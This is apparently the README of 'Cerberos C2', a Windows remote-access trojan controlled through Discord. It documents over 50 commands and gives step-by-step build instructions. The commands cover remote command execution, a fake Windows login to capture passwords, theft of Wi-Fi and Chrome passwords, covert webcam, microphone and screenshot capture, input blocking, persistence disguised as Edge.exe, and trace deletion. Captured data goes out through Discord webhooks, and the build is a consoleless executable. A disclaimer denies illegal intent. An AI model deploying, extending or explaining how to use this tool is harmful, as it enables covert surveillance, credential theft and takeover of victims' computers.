!termcmd {ID}		>> start to delete all cmd windows
!terchrome {ID} 	>> start to delete all chrome windows
!syslan {ID} 		>> get system language
!delclipboard {ID}	>> delete active clipboard
!setclipboard {ID} {T} 	>> replace t with your text. set current clipboard
# Cerberos-C2
Cerberos C2 has over 50+ Functions, Cerberos Uses Discord as the C2. Cerberos CAN ONLY BE USED TO CONTROL WINDOWS. \
Cerberos v1.0.0 is created on 09-8-2022 by Vczz0.\
Cerberos is Tested on Windows 10+\
Total Spended Hours: 25~
#### BTC: bc1ql98s5yu2yt0r0rnp4ytc76sadd2xewapszmpd3


# WARNING!!
Cerberos C2 is not created for illegal purpose. The creator is not responsible for any damage. 

# Why?
i created this program to check my coding and hacking skills, and as a contribution to the hacktoberfest 2022. 
# Requirements
1. Windows 10 for setup
2. Python 3.10.6
3. Discord Application
4. Cerberos-C2.zip

# Todo
1. Email Function.
2. More Cam / microphone functions
3. GUI application
4. Rubberducky script

# Functions
if you use a path you can use {user}. Cerberos C2 will change it to the real username
change {ID} to the client ID wich you want to control.
```
# Cerberos C2
!resetID 			       >> Resets all ID's of clients. New ID's will be used after the program restarts.
!list 				       >> Display all active client's.
!info {ID} 			       >> Displays Version of client.
!terminate {ID} 		       >> Close's Application. Wich results to lose of control of client.

# System
!cmd {ID} {INPUT}		       >> Executes a system command on client. Change {INPUT} To command.
!destruct {ID} 			       >> Delets all trace's of Cerberos C2.
!reboot {ID}                           >> Reboots Client's system.
!shutdown {ID}                         >> Shutsdowb Client's system.
!usbcheck {ID} 			       >> Checks all pluged in device's.
!vm {ID}			       >> Checks if client is vm.
!wcd {ID}			       >> Get Current working dir.
!allproc {ID} 			       >> Lists all current curring processes.
!showerror {ID} {TITLE} {MESSAGE}      >> Shows error message. Change {TITLE} To your own title and {MESSAGE} TO your own message.
!clipboard {ID} 		       >> Gets Client clipboard.
!cd {ID} {DIR}		               >> Change dir to dir given.
!wallpaper {ID} {PATH}                 >> Changes walpaper to given dir. NOTE: "GIVE WHOLE DIR, else the wallpaper is black".
!volumemax {ID}			       >> Maxes out the volume of client.
!volumedown {ID} 		       >> Set's volume to zero of client.
!say {ID} {TEXT} 		       >> Get a voice to say {TEXT}.
!url {ID} {URL} 		       >> Opens {URL} in browser. 
!winlogin {ID} 			       >> Create's a fake window login to try to get a password.
!taskkill {ID} {TASK} 		       >> Kill's a task. Either the id or name.
!wifipw {ID} 			       >> Extracts wifi passwords.
!bluescreen {ID} 		       >> Bluescreen's client.
!window {ID} 			       >> Get client window text. 
!admincheck {ID}                       >> Checks for admin rights.
!termcmd {ID}			       >> start to delete all cmd windows
!terchrome {ID} 	               >> start to delete all chrome windows
!syslan {ID} 		               >> get system language
!delclipboard {ID}	               >> delete active clipboard
!setclipboard {ID} {TEXT} 	       >> replace {TEXT} with your text. set current clipboard
# Files
!upload {ID} {LINK} {NAME} / {PATH}    >> Uploads a file. Trough link. you can upload a file in the #upload channel and copy link from there. Enter file or path to store file.
!download {ID} {FILE}		       >> Downloads file from client. 
!remove {ID} {FILE} 		       >> Removes file from client
!mkdir 				       >> Make's a dir on client.

# Mouse / Keys    		       
!key {ID} {KEY} 		       >> Clicks Key given on clients keyboard change {KEY} with the key.
!morekey {ID} {KEY} 		       >> Clicks multiple Key given on clients keyboard change {KEY} with the key's.
!mousemove {ID} {coordinates} 	           >> Move's client mouse to given coordinates.
!mouseclick {ID} {coordinates} 	           >> Clicks on coordinates given.
!mouysedoubleclick {ID} {coordinates}      >> Double clicks on coordinates given.


# Cam
!screenshot {ID} 		       >> Takes a screenshot of client.
!frontcam {ID}    		       >> Takes a picture of client's frontcam.
!mic {ID}			       >> Records MIC from client for 9 seconds.
!camcount {ID} 			       >> Counts all systemcams.

# IP
!ipinfo {ID}			       >> Displays IP info of client. Country, Region etc.
!ipmap {ID} 			       >> Converts IP Lat, Long of client to a map.

# admin rights
!block {ID} 			       >> Blocks input, keyboard, mouse.
!unblock {ID} 			       >> Unblocks input. 
!displayoff {ID} 		       >> Blocks client input and set a black screen.
!displayon {ID} 		       >> Unblock client input and removes blackscreen. 

#persist
!persist {ID}			       >> Creates persistance on client. Exe: Edge.exe Regname: Edge.
!peristcheck {ID}		       >> Checks for persistance on client.
!persistdelete {ID}                    >> Tries to delete persistance.

# Chrome
!chromehistory {ID}		       >> Gets Chrome history of client. 
!chromecred {ID} 		       >> Extracts Chrome passwords.

#Rickroll
!rickroll {ID}			       >> Open's a rickroll video.

```





 

# Instalation
1. Click on [this link](https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe) to download python 3.10.6.
2. Open te Python application.
3. Click "[ ] Add Python 3.10.6 to path] > "install now". Wait till finished after that you can close the Python application.
4. Open the Github of Cerberos-C2 > Click on "Code" > "Download ZIP". Wait till download is finished.
5. Unzip "Cerberos-C2.zip".
6. Open the folder "Cerberos-C2".
7. Right click on mouse and click on "Properties" > copy the "Location".
8. Open "CMD" > type: "cd" paste the copied Location + \Cerberos-C2 > hit "Enter".
9. Type: ```pip install -r requirements.txt```. Wait till its finished. Click on "-" To Minimize CMD.
10. Open Cerberus-C2 Folder again and double Click on the folder "main" > right click on "main.py" > "Edit" > "Edit with EDILE". Or you can edit it with Notepad. Minimize the Edile.
11. Click on [this link](https://discord.new/4A2stHvnUmXV) to copy the server template.
12. Change the server name to: "Cerberos C2".
13. Click on the green button "Create".
14. Open Discord > Click on the Server "Cerberos C2" > Click on "Cerberos C2" > "Server Settings" > "Integrations" > "Create Webhook".
15. Change the name of the webhook To: "Cerberos-AgentOnline" > Set channel to: "#agent-online" > Click On "Copy Webhook URL".
16. Open The Idle to change "main.py". Scroll till you see: AGENT_ONLINE_ID = "[AGENT_ONLINE_WBHOOK]". Replace [AGENT_ONLINE_WBHOOK] with your Copied Cerberos-AgentOnline Webhook setup earlier.
17. Click on "New Webhook" > change the name to "Cerberos-C2" > Channel to: "#c2"  > "Copy Webhook URL". 
18. Open The Idle to change "main.py". Scroll till you see: COMMAND_CONTROL_ID = "[C2_WEBHOOK]". Replace [C2_WEBHOOK] with your Copied Cerberos-C2 Webhook setup earlier.
19. Click on "New Webhook" > change the name to "Cerberos-Screenshots" > Channel to: "#screenshots" > "Copy Webhook URL".
20. Open The Idle to change "main.py". Scroll till you see: SCREENSHOT_ID = "[SCREENSHOT_WEBHOOK]". Replace [SCREENSHOT_WEBHOOK] with your Copied Cerberos-Screenshots Webhook setup earlier.
21. Click on "New Webhook" > change the name to "Cerberos-Webcam" > Channel to: "#webcam" > "Copy Webhook URL".
22. Open The Idle to change "main.py". Scroll till you see: WEB_CAM_ID = "[WEBCAM_WEBHOOK]". Replace [WEBCAM_WEBHOOK] with your Copied Cerberos-Webcam Webhook setup earlier.
23. Click on "New Webhook" > change the name to "Cerberos-Microphone" > Channel to: "#microphone"  > "Copy Webhook URL".
24. Open The Idle to change "main.py". Scroll till you see: MIC_ID = "[MICROPHONE_WEBHOOK]". Replace [MICROPHONE_WEBHOOK] with your Copied Cerberos-Microphone Webhook setup earlier.
25. Click on "New Webhook" > change the name to "Cerberos-Downloads" > Channel to: "#downloads" > "Copy Webhook URL".
26. Open The Idle to change "main.py". Scroll till you see: DOWNLOAD_ID = "[DOWNLOAD_WEBHOOK]". Replace [DOWNLOAD_WEBHOOK] with your Copied Cerberos-Downloads Webhook setup earlier.
27. Open your webbrowser and go to the discord developer portal website. You might have to login.
28. Click on "New application" > Set The Name Tho "Cerberos-C2" > "Create". By clicking on the image of the bot you set an logo if you want. The Logo can be found in the zip. 
29. On The left side click on "OAuth2" > "URL Generator". Click on "Bot". Then click on "Administrator.
30. Then there is a generated link click on "Copy". 
31. Open a new tab and enter the link. Note: "Sometimes it takes a bit of time".
32. Select the server: Cerberos C2.
33. click on "continue" > "authorize". do the verification.
34. Go back to the developer portal and go to "Bot" > "Copy" To copy the token. or you have to click "Reset" and then copy the token.
35. Open The Idle to change "main.py". Scroll till you see: BOT_TOKEN = "[BOT_TOKEN_HERE]". Replace [BOT_TOKEN_HERE] with your Copied Bot token setup earlier
36. Open the cmd window again. now type: ```pyinstaller main\main.py --onefile --noconsole --i \ico\exe.ixo``` and hit "Enter"
37. You can find the exe in the dist dir. 

